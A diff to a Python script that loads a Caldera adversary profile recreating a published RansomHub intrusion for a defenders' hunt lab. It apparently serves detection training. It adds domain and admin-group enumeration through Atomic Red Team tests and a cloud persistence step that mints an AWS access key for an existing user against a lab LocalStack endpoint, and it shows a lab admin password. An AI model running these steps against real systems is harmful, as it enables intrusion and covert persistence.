@@ -4,7 +4,7 @@ caldera_ransomhub_setup.py
 Hunt Lab recreation of The DFIR Report (2025-06):
 "Hide Your RDP: Password Spray Leads to RansomHub Deployment".
 
-POSTs 12 attack abilities + 3 dwell-time abilities and one adversary
+POSTs 13 attack abilities + 3 dwell-time abilities and one adversary
 "DFIR-RansomHub-2025-Lab" into Caldera so it can be run against agent
 group 'red' (the three Windows lab VMs).
 
@@ -144,7 +144,7 @@ def dwell_ability(ability_id, name, seconds, description):
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "dwell"],
         "buckets": ["dwell"],
@@ -155,30 +155,39 @@ def dwell_ability(ability_id, name, seconds, description):
 abilities = [
     {
         "ability_id": "rh-01-recon-domain",
-        "name": "RH: Domain & user enumeration",
+        "name": "RH: Domain & user enumeration (ART chain)",
         "description": (
-            "Native Windows domain recon. Mirrors the actor's first-hour "
-            "enumeration in The DFIR Report RansomHub case "
-            "(net group, nltest, ipconfig, whoami /all)."
+            "Mirrors the actor's first-hour enumeration from The DFIR "
+            "Report RansomHub case as a chain of five Atomic Red Team "
+            "tests instead of one inline PowerShell line. Each fires a "
+            "discrete native binary so defenders see the canonical "
+            "process tree (powershell.exe -> whoami/net/nltest/ipconfig) "
+            "and the command lines match every public ART-attributed "
+            "detection rule:\n"
+            "  T1033     Test 1 - whoami\n"
+            "  T1087.001 Test 1 - net user enumeration\n"
+            "  T1087.002 Test 1 - net group 'Domain Admins' /domain\n"
+            "  T1482     Test 1 - nltest /domain_trusts\n"
+            "  T1016     Test 1 - ipconfig /all"
         ),
         "tactic": "discovery",
         "technique_name": "Domain Account Discovery",
         "technique_id": "T1087.002",
         "executors": psh(
-            "whoami /all; "
-            "net user /domain; "
-            "net group 'Domain Admins' /domain; "
-            "net group 'Enterprise Admins' /domain; "
-            "nltest /domain_trusts; "
-            "ipconfig /all",
-            timeout=120,
+            f"{ART_IMPORT}; "
+            "Invoke-AtomicTest T1033     -TestNumbers 1; "
+            "Invoke-AtomicTest T1087.001 -TestNumbers 1; "
+            "Invoke-AtomicTest T1087.002 -TestNumbers 1; "
+            "Invoke-AtomicTest T1482     -TestNumbers 1; "
+            "Invoke-AtomicTest T1016     -TestNumbers 1",
+            timeout=300,
         ),
         "requirements": [],
         "privilege": "",
         "repeatable": False,
         "singleton": False,
         "additional_info": {},
-        "tags": ["hunt-lab", "ransomhub", "discovery"],
+        "tags": ["hunt-lab", "ransomhub", "discovery", "atomic"],
         "buckets": ["discovery"],
     },
     {
@@ -243,7 +252,7 @@ abilities = [
         "requirements": [],
         "privilege": "Elevated",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "credential-access", "atomic"],
         "buckets": ["credential-access"],
@@ -267,7 +276,7 @@ abilities = [
         "requirements": [],
         "privilege": "Elevated",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "credential-access", "atomic"],
         "buckets": ["credential-access"],
@@ -305,7 +314,7 @@ abilities = [
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "discovery"],
         "buckets": ["discovery"],
@@ -369,7 +378,7 @@ abilities = [
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "command-and-control"],
         "buckets": ["command-and-control"],
@@ -399,7 +408,7 @@ abilities = [
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "command-and-control"],
         "buckets": ["command-and-control"],
@@ -428,7 +437,7 @@ abilities = [
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "exfiltration"],
         "buckets": ["exfiltration"],
@@ -461,7 +470,7 @@ abilities = [
         "requirements": [],
         "privilege": "Elevated",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "impact", "atomic"],
         "buckets": ["impact"],
@@ -488,7 +497,7 @@ abilities = [
         "requirements": [],
         "privilege": "",
         "repeatable": False,
-        "singleton": False,
+        "singleton": True,
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "impact"],
         "buckets": ["impact"],
@@ -514,6 +523,53 @@ abilities = [
         "additional_info": {},
         "tags": ["hunt-lab", "ransomhub", "defense-evasion", "atomic"],
         "buckets": ["defense-evasion"],
+    },
+    {
+        "ability_id": "rh-13-cloud-persist",
+        "name": "RH: Cloud recon + access-key persistence (LocalStack)",
+        "description": (
+            "Post-wipe cloud persistence. After clearing Windows event logs "
+            "the attacker pivots to cloud APIs the local logs don't cover. "
+            "Points AWS CLI at the lab's LocalStack endpoint and runs "
+            "GetCallerIdentity -> ListUsers -> ListBuckets -> CreateAccessKey "
+            "against the existing analyst-readonly IAM user (seeded by the "
+            "docker bootstrap). The CreateAccessKey event is the high-signal "
+            "persistence telemetry — and unlike the Security log, it survives "
+            "wevtutil cl because it lives in CloudTrail. Maps to T1078.004 "
+            "(action under stolen identity) + T1098.001 (mint an additional "
+            "access key for an existing user)."
+        ),
+        "tactic": "persistence",
+        "technique_name": "Additional Cloud Credentials",
+        "technique_id": "T1098.001",
+        "executors": psh(
+            "$env:AWS_ENDPOINT_URL = 'http://192.168.56.10:4566'; "
+            "$env:AWS_ACCESS_KEY_ID = 'test'; "
+            "$env:AWS_SECRET_ACCESS_KEY = 'test'; "
+            "$env:AWS_DEFAULT_REGION = 'us-east-1'; "
+            "$awsDir = 'C:\\Program Files\\Amazon\\AWSCLIV2'; "
+            "if (-not (Test-Path \"$awsDir\\aws.exe\")) { "
+            "  Write-Output 'Installing AWS CLI v2...'; "
+            "  $msi = 'C:\\Users\\Public\\AWSCLIV2.msi'; "
+            "  & curl.exe -fsSL -o $msi 'https://awscli.amazonaws.com/AWSCLIV2.msi'; "
+            "  if ($LASTEXITCODE -ne 0) { Write-Error 'AWS CLI download failed'; exit 1 }; "
+            "  Start-Process msiexec.exe -ArgumentList '/i', $msi, '/quiet', '/norestart' -Wait "
+            "}; "
+            "$env:PATH = \"$awsDir;$env:PATH\"; "
+            "Write-Output '--- whoami ---'; aws sts get-caller-identity; "
+            "Write-Output '--- iam users ---'; aws iam list-users; "
+            "Write-Output '--- s3 buckets ---'; aws s3api list-buckets; "
+            "Write-Output '--- create access key ---'; "
+            "aws iam create-access-key --user-name analyst-readonly",
+            timeout=300,
+        ),
+        "requirements": [],
+        "privilege": "",
+        "repeatable": False,
+        "singleton": True,
+        "additional_info": {},
+        "tags": ["hunt-lab", "ransomhub", "cloud", "persistence"],
+        "buckets": ["persistence"],
     },
 ]
 
@@ -576,7 +632,7 @@ if __name__ == "__main__":
         print("                   Adversary: DFIR-RansomHub-2025-Lab")
         print("                   Group:     red")
         print()
-        print(f"  Caldera: {CALDERA}  (admin / admin)")
+        print(f"  Caldera: {CALDERA}  (admin / HuntLab2026!)")
     else:
         print("Some objects failed - see errors above.", file=sys.stderr)
         sys.exit(1)
